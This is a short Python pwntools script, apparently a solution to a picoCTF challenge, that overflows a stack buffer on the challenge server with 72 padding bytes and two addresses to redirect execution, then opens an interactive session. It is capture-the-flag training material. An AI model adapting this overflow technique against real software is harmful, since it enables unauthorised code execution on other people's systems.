from pwn import *

#r = process("./vuln")
r = remote("saturn.picoctf.net", 63394)

payload = b'a'*72 + p64(0x000000000040133e) + p64(0x401236)
r.sendlineafter('flag: ', payload)

r.interactive()